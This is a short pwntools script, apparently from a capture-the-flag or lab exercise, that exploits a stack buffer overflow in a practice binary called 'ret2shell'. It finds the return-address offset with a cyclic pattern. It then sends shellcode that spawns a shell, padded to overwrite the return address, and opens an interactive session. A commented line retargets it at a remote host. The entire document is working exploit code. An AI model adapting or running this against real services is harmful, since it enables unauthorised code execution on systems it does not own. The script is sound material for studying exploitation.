from pwn import *

def find_eip_offset(binary):
    '''
    Automate the process of using cyclic patterns to find the offset
    '''
    proc = process(binary)
    proc.recvuntil(b':', timeout=1)
    proc.sendline(cyclic(200))
    proc.wait() # process will crash
    return cyclic_find(proc.corefile.pc)

# load the binary
binary = './ret2shell'
elf = context.binary = ELF(binary, checksec = False)

# turn on debugging messages
context.log_level = 'debug'

# execute the binary
proc = process(binary)
# proc = remote('10.0.0.1', 9011)

# find the offset of the eip value
# offset = find_eip_offset(binary)
offset = 136

shellcode_asm = shellcraft.sh()
shellcode = asm(shellcode_asm)

# prepare our payload
payload = flat(
    shellcode,
    b'A' * (offset - len(shellcode)),
    p64(0x4010ac)
)
write(f'{binary}.payload', payload)

# wait for the prompt, then send our password payload
proc.recvuntil(b':', timeout=1)
proc.sendline(payload)

# print the result
proc.interactive()
